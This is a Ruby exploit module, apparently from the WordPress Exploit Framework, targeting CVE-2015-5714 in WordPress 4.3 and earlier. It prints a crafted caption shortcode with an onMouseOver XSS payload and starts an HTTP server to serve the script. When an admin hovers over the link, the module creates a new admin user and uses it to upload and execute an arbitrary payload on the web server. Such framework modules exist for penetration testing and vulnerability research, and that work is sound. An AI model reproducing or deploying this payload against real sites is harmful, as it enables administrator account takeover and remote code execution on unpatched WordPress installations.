# frozen_string_literal: true

class Wpxf::Exploit::Wp43ShortcodeXssShellUpload < Wpxf::Module
  include Wpxf
  include Wpxf::WordPress::Xss

  def initialize
    super

    update_info(
      name: 'WordPress <= 4.3 Shortcode Stored XSS Shell Upload',
      desc: 'In version 4.3 and below of WordPress, a stored XSS '\
            'vulnerability exists that allows a user to store a script if '\
            'they have the required permissions to publish a new post.'\
            "\n"\
            'This module prepares a shortcode that can be included in a post '\
            'which when hovered over by an admin user will create '\
            'a new admin user which will be used to upload and execute the '\
            'selected payload in the context of the web server.',
      author: [
        'Shahar Tal',    # Discovery and disclosure
        'Netanel Rubin', # Discovery and disclosure
        'rastating'      # WPXF module
      ],
      references: [
        ['CVE', '2015-5714'],
        ['WPVDB', '8186'],
        ['URL', 'https://wordpress.org/news/2015/09/wordpress-4-3-1/']
      ],
      date: 'Sept 15 2015'
    )
  end

  def check
    version = wordpress_version
    return :unknown if version.nil?
    return :vulnerable if version < Gem::Version.new('4.3.1')
    :safe
  end

  def run
    return false unless super

    @success = false
    emit_info 'Create a new post with the below shorttag included:'
    puts
    puts "[caption width=\"1\" caption='<a href=\"' \">]</a><a href=\""\
         "http://onMouseOver='#{xss_ascii_encoded_include_script}'"\
         '">Click Me</a>'
    puts

    start_http_server
    @success
  end
end
